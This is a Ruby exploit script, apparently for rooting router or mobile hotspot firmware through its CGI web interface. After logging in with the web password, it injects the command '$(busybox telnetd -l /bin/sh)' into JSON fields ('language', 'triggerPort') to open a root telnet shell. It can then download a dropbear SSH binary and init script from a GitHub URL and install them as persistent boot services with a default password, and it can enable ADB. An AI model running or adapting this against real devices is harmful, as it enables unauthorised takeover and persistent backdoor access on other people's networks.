#!env ruby
require 'bundler'
Bundler.require

require 'json'
require 'openssl'
class TPown 
    attr_accessor :options

    def initialize
        @options = {
        }
    end

    
    def detect_version
        
        if @options[:rce] == 1 || detect_v1
            @options[:rce] = 1
            @options[:cgi_path] = "qcmap_auth"
            puts "[ok] Detected v1"
        elsif @options[:rce] == 5 || detect_v5
            @options[:rce] = 5
            @options[:cgi_path] = "auth_cgi"
            puts "[ok] Detected v5"
        else
            raise "No suitable RCE found"
        end
    end

    def cleanup
        cleanup_v1 if @options[:rce] == 1
        cleanup_v5 if @options[:rce] == 5
    end

    def payload
        payload_v1 if @options[:rce] == 1
        payload_v5 if @options[:rce] == 5
    end

    def connect_telnet()
        puts "Connecting to telnetd"
        @client = Net::Telnet::new("Host" => @options[:target], "Prompt" => /\/ # \z/n, "Timeout" => 10, "Telnetmode" => true, "Waittime" => 0.3)
        
    end

    def cmd(c)
        connect_telnet if @client.nil? 
        data = ""
        @client.cmd(c) do |c|
            data += c
        end

        return data
    end

    def ping_telnet()
        puts "Testing telnet connection"
        puts cmd("uname -a")
    end

    def login()
        
        login_data = {"module": "authenticator", "action": 0}.to_json
        res = Curl.post("http://#{@options[:target]}/cgi-bin/#{@options[:cgi_path]}", login_data) do |http|
            http.headers["Content-Type"] = "application/json"
        end

        data = JSON.parse(res.body)
 

        
        nonce = data["nonce"].to_s
        if @options[:rce] == 1
            digest = ::OpenSSL::Digest::MD5.hexdigest(@options[:name] + ":" + @options[:pass] + ":" + nonce)
        else
            digest = ::OpenSSL::Digest::MD5.hexdigest(@options[:pass] + ":" + nonce)
        end
        login_data = {"module": "authenticator", "action": 1, "digest": digest}.to_json

        res = Curl.post("http://#{@options[:target]}/cgi-bin/#{@options[:cgi_path]}", login_data) do |http|
            http.headers["Content-Type"] = "application/json"
        end
        data = JSON.parse(res.body)
        if data["authedIP"].nil? or data["authedIP"].to_s == ""
            raise("Wrong password?")
        end

        puts "[ok] Logged in from #{data["authedIP"]}"
        @options[:source] = data["authedIP"].to_s
        @options[:token] = data["token"]
        return true

    end

    def install_ssh
        puts "Downloading dropbear server and init from #{@options[:dropbear_bin]} and #{@options[:dropbear_init]}"

        cmd("test -f /usr/sbin/dropbearmulti || wget -O /usr/sbin/dropbearmulti #{@options[:dropbear_bin]}")
        cmd("test -f /etc/init.d/dropbearserver || wget -O /etc/init.d/dropbearserver #{@options[:dropbear_init]}")
        cmd("chmod +x /etc/init.d/dropbearserver /usr/sbin/dropbearmulti")
        cmd("ln -sv ../init.d/dropbearserver /etc/rc0.d/K77dropbear")
        cmd("ln -sv ../init.d/dropbearserver /etc/rcS.d/S77dropbear")
        
        data = cmd("md5sum /usr/sbin/dropbearmulti")
        if data.match(/c83b037cb48139035b5975d3f3841c70/)
            cmd("/etc/init.d/dropbearserver start")
            puts "Starting dropbear server at #{@options[:target]}. "
            puts "Default password is oelinux123"
        else 
            raise "Wrong checksum of dropbear binary?"
        end

    end

    def install_adb
        puts "Enabling adb by default - so you can use adb shell"
        cmd("uci set usb_enum.enum.mode=debug")
        cmd("usb_enum.enum.debug_pid=902B")
        cmd("echo 902B > /sbin/usb/compositions/hsusb_next")
        cmd("uci commit usb_enum")


    end

    private

    def payload_v1
        payload_data = {

            token: @options[:token],
            module: "webServer",
            action: 1,
            language: "$(busybox telnetd -l /bin/sh)"
        }.to_json
        


        res = Curl.post("http://#{@options[:target]}/cgi-bin/qcmap_web_cgi", payload_data) do |http|
            http.headers["Content-Type"] = "application/json"
        end
        p res.body
       

    
    end

    def cleanup_v1
        payload_del = {

            token: @options[:token],
            module: "webServer",
            action: 1,
            language: "en"
        }.to_json
        res = Curl.post("http://#{@options[:target]}/cgi-bin/qcmap_web_cgi", payload_del) do |http|
            http.headers["Content-Type"] = "application/json"
        end
        p res.body
    end


    def payload_v5
        payload_data = {
            "token": @options[:token],
            "module": "portTrigger",
            "action": 1,
            "entryId": 1,
            "enableState": 1,
            "applicationName": "telnetd",
            "triggerPort": "$(busybox telnetd -l /bin/sh)",
            "triggerProtocol": "TCP",
            "openPort": "1337-2137",
            "openProtocol": "TCP"
        }.to_json

        

        res = Curl.post("http://#{@options[:target]}/cgi-bin/web_cgi", payload_data) do |http|
            http.headers["Content-Type"] = "application/json"
        end
        data = JSON.parse(res.body)
        if data["result"] != 0
            raise "Error setting up payload?"
        end

        puts "[ok] Sent telnetd payload v5"


        

    end

    def cleanup_v5
        payload_del = {
            "token": @options[:token],
            "module": "portTrigger",
            "action": 2,
            "entryIdSet": [1]
        }.to_json

        res = Curl.post("http://#{@options[:target]}/cgi-bin/web_cgi", payload_del) do |http|
            http.headers["Content-Type"] = "application/json"
        end
        data = JSON.parse(res.body)
        if data["result"] != 0
            puts "Error deleting payload - may be safe to ignore"
        else 
            puts "[ok] Deleted payload v5"
        end

    end

    def detect_v1
        login_data = {"module": "authenticator", "action": 0}.to_json
        res = Curl.post("http://#{@options[:target]}/cgi-bin/qcmap_auth", login_data) do |http|
            http.headers["Content-Type"] = "application/json"
        end
        
        return false if res.code == 404
        return true if res.code == 200
        return nil
    end

    def detect_v5
        login_data = {"module": "authenticator", "action": 0}.to_json
        res = Curl.post("http://#{@options[:target]}/cgi-bin/auth_cgi", login_data) do |http|
            http.headers["Content-Type"] = "application/json"
        end
        
        return false if res.code == 404
        return true if res.code == 200
        return nil
    end


end


tp = TPown.new


tp.options = Optimist::options do
    opt :ssh, "Install dropbear SSH server"
    opt :adb, "Enable ADBD service"
    opt :keep, "Keep the telnetd payload"
    opt :pass, "Web interface password", type: String, required: true
    opt :user, "Web interface user (for v1)", type: String
    opt :target, "Target IP", type: String, required: true
    opt :rce, "RCE version, 1, 5 or try to autodetect if left empty", type: Integer
    opt :dropbear_bin, "Dropbear binary location", default: "https://raw.githubusercontent.com/ecdsa521/tpown/main/dropbearmulti"
    opt :dropbear_init, "Dropbear init script location", default: "https://raw.githubusercontent.com/ecdsa521/tpown/main/dropbearserver.sh"
    opt :login_only, "Only attempt to login and quit", default: false
    educate_on_error
    
end

tp.detect_version()
tp.login()
exit if tp.options[:login_only]

tp.payload()
tp.cleanup() unless tp.options[:keep]
tp.ping_telnet()

tp.install_adb() if tp.options[:adb]
tp.install_ssh() if tp.options[:ssh]
